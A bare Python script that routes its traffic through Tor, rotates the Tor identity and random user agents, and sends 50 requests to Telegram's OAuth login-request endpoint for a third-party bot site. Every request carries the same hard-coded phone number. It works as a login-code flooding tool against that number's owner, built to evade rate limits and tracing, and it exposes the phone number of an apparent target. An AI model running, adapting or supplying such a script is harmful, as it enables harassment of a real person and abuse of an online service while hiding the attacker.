import requests
import socks
import socket
import time
from stem import Signal
from stem.control import Controller
import subprocess
from fake_useragent import UserAgent

def restart_tor():
    try:
        subprocess.run(["sudo", "service", "tor", "restart"])
    except subprocess.CalledProcessError:
        pass

def get_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_address = response.json()['ip']
        print("Your IP address is:", ip_address)
    except Exception as e:
        print("Failed to retrieve IP address:", e)

def renew_connection():
    try:
        controller = Controller.from_port(port=9051)
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        time.sleep(controller.get_newnym_wait())
    except Exception as e:
        print("Failed to renew Tor connection:", e)

restart_tor()
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket

get_ip()


for i in range(50):
#     renew_connection()
    get_ip()
    user = UserAgent().random
    headers = {'user-agent': user}
    phone = "+998938811565"
    if i == 10 :
        renew_connection()
        get_ip()
    usernames = ["user1", "user2", "user3", "user4", "user5", "user6", "user7", "user8", "user9"]
    try:
        response = requests.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https://bot-t.com&embed=1&request_access=write&return_to=https://bot-t.com/login',data={'phone':"+998938811565"} )
        print(response)
    except:
        print("Failed to send request:")

#     restart_tor()
    time.sleep(1)

